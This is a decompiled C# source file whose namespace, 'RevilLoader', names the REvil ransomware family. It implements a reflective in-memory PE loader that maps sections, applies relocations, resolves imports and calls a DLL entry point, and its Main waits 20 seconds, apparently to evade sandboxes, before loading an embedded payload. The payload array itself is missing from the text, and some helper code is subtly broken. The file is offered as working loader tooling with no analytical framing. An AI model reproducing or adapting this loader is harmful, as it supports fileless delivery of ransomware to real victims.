using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace RevilLoader;

public static class Program
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IMAGE_DOS_HEADER
	{
		public ushort e_magic;

		public ushort e_cblp;

		public ushort e_cp;

		public ushort e_crlc;

		public ushort e_cparhdr;

		public ushort e_minalloc;

		public ushort e_maxalloc;

		public ushort e_ss;

		public ushort e_sp;

		public ushort e_csum;

		public ushort e_ip;

		public ushort e_cs;

		public ushort e_lfarlc;

		public ushort e_ovno;

		public unsafe fixed ushort e_res[4];

		public ushort e_oemid;

		public ushort e_oeminfo;

		public unsafe fixed ushort e_res2[10];

		public uint e_lfanew;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_NT_HEADERS
	{
		public uint Signature;

		public IMAGE_FILE_HEADER FileHeader;

		public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_FILE_HEADER
	{
		public ushort Machine;

		public ushort NumberOfSections;

		public uint TimeDateStamp;

		public uint PointerToSymbolTable;

		public uint NumberOfSymbols;

		public ushort SizeOfOptionalHeader;

		public ushort Characteristics;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct IMAGE_OPTIONAL_HEADER32
	{
		public ushort Magic;

		public byte MajorLinkerVersion;

		public byte MinorLinkerVersion;

		public uint SizeOfCode;

		public uint SizeOfInitializedData;

		public uint SizeOfUninitializedData;

		public uint AddressOfEntryPoint;

		public uint BaseOfCode;

		public uint BaseOfData;

		public uint ImageBase;

		public uint SectionAlignment;

		public uint FileAlignment;

		public ushort MajorOperatingSystemVersion;

		public ushort MinorOperatingSystemVersion;

		public ushort MajorImageVersion;

		public ushort MinorImageVersion;

		public ushort MajorSubsystemVersion;

		public ushort MinorSubsystemVersion;

		public uint Win32VersionValue;

		public uint SizeOfImage;

		public uint SizeOfHeaders;

		public uint CheckSum;

		public ushort Subsystem;

		public ushort DllCharacteristics;

		public uint SizeOfStackReserve;

		public uint SizeOfStackCommit;

		public uint SizeOfHeapReserve;

		public uint SizeOfHeapCommit;

		public uint LoaderFlags;

		public uint NumberOfRvaAndSizes;

		public unsafe fixed ulong DataDirectory[16];
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IMAGE_DATA_DIRECTORY
	{
		public uint VirtualAddress;

		public uint Size;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct MEMORYMODULE
	{
		public unsafe IMAGE_NT_HEADERS* headers;

		public unsafe byte* codeBase;

		public unsafe uint* modules;

		public int numModules;

		public int initialized;
	}

	private delegate uint DllEntryPointFunc(uint code, uint method, uint flag);

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IMAGE_SECTION_HEADER
	{
		public unsafe fixed byte Name[8];

		public uint PhysicalAddress;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint PointerToRelocations;

		public uint PointerToLinenumbers;

		public ushort NumberOfRelocations;

		public ushort NumberOfLinenumbers;

		public uint Characteristics;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IMAGE_BASE_RELOCATION
	{
		public uint VirtualAddress;

		public uint SizeOfBlock;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IMAGE_IMPORT_DESCRIPTOR
	{
		public uint Characteristics;

		public uint TimeDateStamp;

		public uint ForwarderChain;

		public uint Name;

		public uint FirstThunk;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IMAGE_IMPORT_BY_NAME
	{
		public ushort Hint;

		public unsafe fixed byte Name[1];
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct IMAGE_EXPORT_DIRECTORY
	{
		public uint Characteristics;

		public uint TimeDateStamp;

		public ushort MajorVersion;

		public ushort MinorVersion;

		public uint Name;

		public uint Base;

		public uint NumberOfFunctions;

		public uint NumberOfNames;

		public uint AddressOfFunctions;

		public uint AddressOfNames;

		public uint AddressOfNameOrdinals;
	}

	private const ushort IMAGE_DOS_SIGNATURE = 19802;

	private const byte IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16;

	private const uint PAGE_NOACCESS = 1u;

	private const uint PAGE_READONLY = 2u;

	private const uint PAGE_READWRITE = 4u;

	private const uint PAGE_WRITECOPY = 8u;

	private const uint PAGE_EXECUTE = 16u;

	private const uint PAGE_EXECUTE_READ = 32u;

	private const uint PAGE_EXECUTE_READWRITE = 64u;

	private const uint PAGE_EXECUTE_WRITECOPY = 128u;

	private const uint PAGE_GUARD = 256u;

	private const uint PAGE_NOCACHE = 512u;

	private const uint PAGE_WRITECOMBINE = 1024u;

	private const uint MEM_COMMIT = 4096u;

	private const uint MEM_RESERVE = 8192u;

	private const uint MEM_DECOMMIT = 16384u;

	private const uint MEM_RELEASE = 32768u;

	private const uint MEM_FREE = 65536u;

	private const uint MEM_PRIVATE = 131072u;

	private const uint MEM_MAPPED = 262144u;

	private const uint MEM_RESET = 524288u;

	private const uint MEM_TOP_DOWN = 1048576u;

	private const uint MEM_WRITE_WATCH = 2097152u;

	private const uint MEM_PHYSICAL = 4194304u;

	private const uint MEM_LARGE_PAGES = 536870912u;

	private const uint MEM_4MB_PAGES = 2147483648u;

	private const uint DLL_PROCESS_ATTACH = 1u;

	private const int IMAGE_SIZEOF_SHORT_NAME = 8;

	private const uint IMAGE_SCN_CNT_CODE = 32u;

	private const uint IMAGE_SCN_CNT_INITIALIZED_DATA = 64u;

	private const uint IMAGE_SCN_CNT_UNINITIALIZED_DATA = 128u;

	private const uint IMAGE_SCN_LNK_NRELOC_OVFL = 16777216u;

	private const uint IMAGE_SCN_MEM_DISCARDABLE = 33554432u;

	private const uint IMAGE_SCN_MEM_NOT_CACHED = 67108864u;

	private const uint IMAGE_SCN_MEM_NOT_PAGED = 134217728u;

	private const uint IMAGE_SCN_MEM_SHARED = 268435456u;

	private const uint IMAGE_SCN_MEM_EXECUTE = 536870912u;

	private const uint IMAGE_SCN_MEM_READ = 1073741824u;

	private const uint IMAGE_SCN_MEM_WRITE = 2147483648u;

	private const uint IMAGE_DIRECTORY_ENTRY_BASERELOC = 5u;

	private const uint IMAGE_SIZEOF_BASE_RELOCATION = 8u;

	private const uint IMAGE_REL_BASED_ABSOLUTE = 0u;

	private const uint IMAGE_REL_BASED_HIGHLOW = 3u;

	private const uint IMAGE_DIRECTORY_ENTRY_IMPORT = 1u;

	private const uint IMAGE_DIRECTORY_ENTRY_EXPORT = 0u;

	private const uint DLL_PROCESS_DETACH = 0u;

	private static uint[,,] ProtectionFlags = new uint[2, 2, 2]
	{
		{
			{ 1u, 8u },
			{ 2u, 4u }
		},
		{
			{ 16u, 128u },
			{ 32u, 64u }
		}
	};

	private static ushort Endian(ushort num)
	{
		return (ushort)((num << 8) | (num >> 8));
	}

	private unsafe static void memcpy(byte* dest, byte* src, uint size)
	{
		for (uint num = 0u; num < size; num++)
		{
			dest[(int)num] = src[(int)num];
		}
	}

	private unsafe static void memset(byte* dest, byte c, uint size)
	{
		for (uint num = 0u; num < size; num++)
		{
			*dest = c;
		}
	}

	[DllImport("kernel32.dll")]
	private static extern uint VirtualAlloc(uint lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("kernel32.dll")]
	private static extern int VirtualFree(uint lpAddress, uint dwSize, uint dwFreeType);

	[DllImport("kernel32.dll")]
	private unsafe static extern int VirtualProtect(uint lpAddress, uint dwSize, uint flNewProtect, uint* lpflOldProtect);

	private unsafe static IMAGE_SECTION_HEADER* IMAGE_FIRST_SECTION(IMAGE_NT_HEADERS* img)
	{
		return (IMAGE_SECTION_HEADER*)((int)img + 24 + img->FileHeader.SizeOfOptionalHeader);
	}

	private unsafe static void CopySections(byte* data, IMAGE_NT_HEADERS* old_headers, MEMORYMODULE* module)
	{
		byte* codeBase = module->codeBase;
		IMAGE_SECTION_HEADER* ptr = IMAGE_FIRST_SECTION(module->headers);
		uint num = 0u;
		while (num < module->headers->FileHeader.NumberOfSections)
		{
			if (ptr->SizeOfRawData == 0)
			{
				uint sectionAlignment = old_headers->OptionalHeader.SectionAlignment;
				if (sectionAlignment != 0)
				{
					byte* ptr2 = (byte*)VirtualAlloc((uint)(int)codeBase + ptr->VirtualAddress, sectionAlignment, 4096u, 4u);
					ptr->PhysicalAddress = (uint)ptr2;
					memset(ptr2, 0, sectionAlignment);
				}
			}
			else
			{
				byte* ptr3 = (byte*)VirtualAlloc((uint)(int)codeBase + ptr->VirtualAddress, ptr->SizeOfRawData, 4096u, 4u);
				memcpy(ptr3, (byte*)((uint)(int)data + ptr->PointerToRawData), ptr->SizeOfRawData);
				ptr->PhysicalAddress = (uint)ptr3;
			}
			num++;
			ptr++;
		}
	}

	private unsafe static void FinalizeSections(MEMORYMODULE* module)
	{
		IMAGE_SECTION_HEADER* ptr = IMAGE_FIRST_SECTION(module->headers);
		int num = 0;
		uint num2 = 0u;
		while (num < module->headers->FileHeader.NumberOfSections)
		{
			uint num3 = Convert.ToUInt32((ptr->Characteristics & 0x20000000) != 0);
			uint num4 = Convert.ToUInt32((ptr->Characteristics & 0x40000000) != 0);
			uint num5 = Convert.ToUInt32((ptr->Characteristics & 0x80000000u) != 0);
			if ((ptr->Characteristics & 0x2000000u) != 0)
			{
				VirtualFree(ptr->PhysicalAddress, ptr->SizeOfRawData, 16384u);
			}
			else
			{
				uint num6 = ProtectionFlags[num3, num4, num5];
				if ((ptr->Characteristics & 0x4000000u) != 0)
				{
					num6 |= 0x200u;
				}
				uint num7 = ptr->SizeOfRawData;
				if (num7 == 0)
				{
					if ((ptr->Characteristics & 0x40u) != 0)
					{
						num7 = module->headers->OptionalHeader.SizeOfInitializedData;
					}
					else if ((ptr->Characteristics & 0x80u) != 0)
					{
						num7 = module->headers->OptionalHeader.SizeOfUninitializedData;
					}
				}
				if (num7 != 0)
				{
					VirtualProtect(ptr->PhysicalAddress, ptr->SizeOfRawData, num6, &num2);
				}
			}
			num++;
			ptr++;
		}
	}

	private unsafe static IMAGE_DATA_DIRECTORY* GET_HEADER_DICTIONARY(MEMORYMODULE* module, uint idx)
	{
		return (IMAGE_DATA_DIRECTORY*)(module->headers->OptionalHeader.DataDirectory + idx);
	}

	private unsafe static void PerformBaseRelocation(MEMORYMODULE* module, uint delta)
	{
		byte* codeBase = module->codeBase;
		IMAGE_DATA_DIRECTORY* ptr = GET_HEADER_DICTIONARY(module, 5u);
		if (ptr->Size == 0)
		{
			return;
		}
		IMAGE_BASE_RELOCATION* ptr2 = (IMAGE_BASE_RELOCATION*)((uint)(int)codeBase + ptr->VirtualAddress);
		while (ptr2->VirtualAddress != 0)
		{
			byte* ptr3 = (byte*)((uint)(int)codeBase + ptr2->VirtualAddress);
			ushort* ptr4 = (ushort*)((byte*)ptr2 + 8);
			uint num = 0u;
			while (num < (ptr2->SizeOfBlock - 8) / 2u)
			{
				int num2 = *ptr4 >> 12;
				uint num3 = *ptr4 & 0xFFFu;
				uint num4 = (uint)num2;
				if (num4 != 0 && num4 == 3)
				{
					uint* ptr5 = (uint*)((uint)(int)ptr3 + num3);
					*ptr5 += delta;
				}
				num++;
				ptr4++;
			}
			ptr2 = (IMAGE_BASE_RELOCATION*)((uint)(int)ptr2 + ptr2->SizeOfBlock);
		}
	}

	[DllImport("kernel32.dll")]
	private unsafe static extern uint LoadLibraryA(byte* lpLibFileName);

	[DllImport("kernel32.dll")]
	private unsafe static extern uint GetProcAddress(uint hModule, byte* lpProcName);

	private unsafe static byte* realloc(byte* bytes, uint newsize, uint oldsize)
	{
		byte* ptr = (byte*)Marshal.AllocHGlobal((int)newsize).ToPointer();
		if (bytes != null)
		{
			memcpy(ptr, bytes, oldsize);
			Marshal.FreeHGlobal(new IntPtr(bytes));
		}
		return ptr;
	}

	private unsafe static bool BuildImportTable(MEMORYMODULE* module)
	{
		bool flag = true;
		byte* codeBase = module->codeBase;
		IMAGE_DATA_DIRECTORY* ptr = GET_HEADER_DICTIONARY(module, 1u);
		if (ptr->Size != 0)
		{
			for (IMAGE_IMPORT_DESCRIPTOR* ptr2 = (IMAGE_IMPORT_DESCRIPTOR*)((uint)(int)codeBase + ptr->VirtualAddress); ptr2->Name != 0; ptr2++)
			{
				uint num = LoadLibraryA((byte*)((uint)(int)codeBase + ptr2->Name));
				if (num != 0)
				{
					module->modules = (uint*)realloc((byte*)module->modules, (uint)((module->numModules + 1) * 4), (uint)(module->numModules * 4));
					if (module->modules != null)
					{
						module->modules[module->numModules++] = num;
						uint* ptr3;
						uint* ptr4;
						if (ptr2->Characteristics != 0)
						{
							ptr3 = (uint*)((uint)(int)codeBase + ptr2->Characteristics);
							ptr4 = (uint*)((uint)(int)codeBase + ptr2->FirstThunk);
						}
						else
						{
							ptr3 = (uint*)((uint)(int)codeBase + ptr2->FirstThunk);
							ptr4 = (uint*)((uint)(int)codeBase + ptr2->FirstThunk);
						}
						while (*ptr3 != 0)
						{
							if ((*ptr3 & 0x80000000u) != 0)
							{
								*ptr4 = GetProcAddress(num, (byte*)(*ptr3 & 0xFFFFu));
							}
							else
							{
								IMAGE_IMPORT_BY_NAME* ptr5 = (IMAGE_IMPORT_BY_NAME*)((uint)(int)codeBase + *ptr3);
								*ptr4 = GetProcAddress(num, (byte*)((int)ptr5 + 2L));
							}
							if (*ptr4 != 0)
							{
								ptr3++;
								ptr4++;
								continue;
							}
							flag = false;
							break;
						}
						if (!flag)
						{
							break;
						}
						continue;
					}
					flag = false;
					break;
				}
				flag = false;
				break;
			}
		}
		return flag;
	}

	private unsafe static bool stricmp(string str, byte* bytes)
	{
		int num = 0;
		while (*bytes != 0 && num < str.Length)
		{
			if (str[num] == bytes[num])
			{
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	[DllImport("kernel32.dll")]
	private static extern int FreeLibrary(uint hLibModule);

	public unsafe static int MemoryLoadLibrary(byte[] bytes)
	{
		fixed (byte* ptr = bytes)
		{
			IMAGE_DOS_HEADER* ptr2 = (IMAGE_DOS_HEADER*)ptr;
			if (Endian(ptr2->e_magic) != 19802)
			{
				return 0;
			}
			IMAGE_NT_HEADERS* ptr3 = (IMAGE_NT_HEADERS*)(ptr + (int)ptr2->e_lfanew);
			uint num = VirtualAlloc(ptr3->OptionalHeader.ImageBase, ptr3->OptionalHeader.SizeOfImage, 8192u, 4u);
			if (num == 0)
			{
				num = VirtualAlloc(0u, ptr3->OptionalHeader.SizeOfImage, 8192u, 4u);
			}
			if (num == 0)
			{
				return 0;
			}
			MEMORYMODULE* ptr4 = (MEMORYMODULE*)(void*)Marshal.AllocHGlobal(sizeof(MEMORYMODULE));
			ptr4->codeBase = (byte*)num;
			ptr4->numModules = 0;
			ptr4->modules = null;
			ptr4->initialized = 0;
			VirtualAlloc(num, ptr3->OptionalHeader.SizeOfImage, 4096u, 4u);
			uint num2 = VirtualAlloc(num, ptr3->OptionalHeader.SizeOfHeaders, 4096u, 4u);
			memcpy((byte*)num2, (byte*)ptr2, ptr2->e_lfanew + ptr3->OptionalHeader.SizeOfHeaders);
			ptr4->headers = (IMAGE_NT_HEADERS*)(num2 + (int)ptr2->e_lfanew);
			ptr4->headers->OptionalHeader.ImageBase = num;
			CopySections(ptr, ptr3, ptr4);
			uint num3 = num - ptr3->OptionalHeader.ImageBase;
			if (num3 != 0)
			{
				PerformBaseRelocation(ptr4, num3);
			}
			if (BuildImportTable(ptr4))
			{
				FinalizeSections(ptr4);
				if (ptr4->headers->OptionalHeader.AddressOfEntryPoint != 0)
				{
					uint num4 = num + ptr4->headers->OptionalHeader.AddressOfEntryPoint;
					if (num4 == 0 || ((DllEntryPointFunc)Marshal.GetDelegateForFunctionPointer(new IntPtr(num4), typeof(DllEntryPointFunc)))(num, 1u, 0u) == 0)
					{
						goto IL_01bc;
					}
					ptr4->initialized = 1;
				}
				return (int)ptr4;
			}
			goto IL_01bc;
			IL_01bc:
			return 0;
		}
	}

	public unsafe static int MemoryGetProcAddress(int module, string name)
	{
		byte* codeBase = ((MEMORYMODULE*)module)->codeBase;
		int num = -1;
		IMAGE_DATA_DIRECTORY* ptr = GET_HEADER_DICTIONARY((MEMORYMODULE*)module, 0u);
		if (ptr->Size == 0)
		{
			return 0;
		}
		IMAGE_EXPORT_DIRECTORY* ptr2 = (IMAGE_EXPORT_DIRECTORY*)((uint)(int)codeBase + ptr->VirtualAddress);
		if (ptr2->NumberOfNames != 0 && ptr2->NumberOfFunctions != 0)
		{
			uint* ptr3 = (uint*)((uint)(int)codeBase + ptr2->AddressOfNames);
			ushort* ptr4 = (ushort*)((uint)(int)codeBase + ptr2->AddressOfNameOrdinals);
			uint num2 = 0u;
			while (num2 < ptr2->NumberOfNames)
			{
				if (!stricmp(name, (byte*)((uint)(int)codeBase + *ptr3)))
				{
					num2++;
					ptr3++;
					ptr4++;
					continue;
				}
				num = *ptr4;
				break;
			}
			if (num == -1)
			{
				return 0;
			}
			if ((uint)num > ptr2->NumberOfFunctions)
			{
				return 0;
			}
			return (int)codeBase + (int)(*(uint*)((uint)((int)codeBase + (int)ptr2->AddressOfFunctions) + num * 4));
		}
		return 0;
	}

	public unsafe static void MemoryFreeLibrary(int mod)
	{
		MEMORYMODULE* ptr = (MEMORYMODULE*)mod;
		if (ptr == null)
		{
			return;
		}
		if (ptr->initialized != 0)
		{
			((DllEntryPointFunc)Marshal.GetDelegateForFunctionPointer(new IntPtr((uint)((int)ptr->codeBase + (int)ptr->headers->OptionalHeader.AddressOfEntryPoint)), typeof(DllEntryPointFunc)))((uint)ptr->codeBase, 1u, 0u);
			ptr->initialized = 0;
		}
		if (ptr->modules != null)
		{
			for (int i = 0; i < ptr->numModules; i++)
			{
				if (ptr->modules[i] != 0)
				{
					FreeLibrary(ptr->modules[i]);
				}
			}
			Marshal.FreeHGlobal(new IntPtr(ptr->modules));
		}
		if (ptr->codeBase != null)
		{
			VirtualFree((uint)ptr->codeBase, 0u, 32768u);
		}
		Marshal.FreeHGlobal(new IntPtr(ptr));
	}

	public static byte[] GetBytesFromFile(string fullFilePath)
	{
		FileStream fileStream = File.OpenRead(fullFilePath);
		try
		{
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
			fileStream.Close();
			return array;
		}
		finally
		{
			fileStream.Close();
		}
	}

	public static string ReverseString(string s)
	{
		char[] array = s.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	private static void Main(string[] args)
	{
		Thread.Sleep(20000);
		MemoryLoadLibrary(bytes);
	}
}